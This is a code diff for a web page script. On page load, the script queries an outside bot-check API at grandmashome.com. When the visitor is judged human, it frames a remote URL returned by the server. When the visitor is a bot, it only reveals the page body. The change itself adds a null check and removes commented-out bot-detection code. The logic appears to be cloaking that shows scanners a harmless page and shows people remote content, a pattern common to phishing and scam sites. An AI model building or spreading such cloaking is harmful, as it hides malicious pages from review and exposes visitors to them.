@@ -23,7 +23,10 @@ const createLoader = () => {
 }
 const toggleLoad = () => {
     const body = document.querySelector('body');
-    body.removeAttribute('hidden');
+    if (body) {
+        body.removeAttribute('hidden');
+
+    }
     const load_frame = document.querySelector('#load_frame');
     if (load_frame) {
         load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
@@ -47,18 +50,8 @@ window.addEventListener('message', (message) => {
 })
 
 window.addEventListener('DOMContentLoaded', () => {
-    // botdPromise
-    // .then((botd) => botd.detect())
-    // .then(async (result) => {
-    //     if (result) {
-            
-    //     }
-
-    // }).catch((error) => console.error(error))
-
     fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            
             createFrame(res.url + 'JPyc2JmS')
         } else {
              setTimeout(toggleLoad, 500);
